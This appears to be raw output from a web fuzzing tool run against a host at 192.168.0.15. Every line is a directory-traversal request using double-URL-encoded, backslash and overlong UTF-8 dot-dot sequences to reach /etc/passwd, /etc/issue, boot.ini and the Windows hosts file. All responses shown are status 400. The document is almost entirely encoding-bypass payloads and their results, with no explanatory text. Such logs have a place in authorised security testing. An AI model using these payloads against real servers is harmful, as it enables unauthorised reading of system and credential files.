2,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66issue
4,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66windows%%32%%66system32%%32%%66drivers%%32%%66etc%%32%%66hosts
3,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66passwd
5,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66boot.ini
6,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66issue
7,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66passwd
8,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66windows%%32%%66system32%%32%%66drivers%%32%%66etc%%32%%66hosts
9,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66boot.ini
10,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66issue
20,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66windows%%32%%66system32%%32%%66drivers%%32%%66etc%%32%%66hosts
21,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66boot.ini
22,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66etc%%32%%66issue
23,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66etc%%32%%66passwd
24,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66windows%%32%%66system32%%32%%66drivers%%32%%66etc%%32%%66hosts
25,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63boot.ini
26,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63issue
27,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63passwd
11,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66%%32%%65%%32%%65%%32%%66etc%%32%%66passwd
28,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts
29,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63boot.ini
31,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63passwd
32,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts
36,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts
30,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63issue
33,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63boot.ini
34,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63issue
35,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63passwd
85,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cboot.ini
84,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
81,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cboot.ini
82,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cetc%255cissue
86,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cetc%255cissue
37,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63boot.ini
38,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63issue
39,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63passwd
40,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts
89,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cboot.ini
90,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cetc%255cissue
87,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cetc%255cpasswd
93,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255cboot.ini
92,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
91,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255c%%32%%65%%32%%65%255cetc%255cpasswd
41,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63boot.ini
42,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63issue
43,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63etc%%35%%63passwd
44,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63%%32%%65%%32%%65%%35%%63windows%%35%%63system32%%35%%63drivers%%35%%63etc%%35%%63hosts
45,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%%35%%63boot.ini
106,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afetc%25c0%25afissue
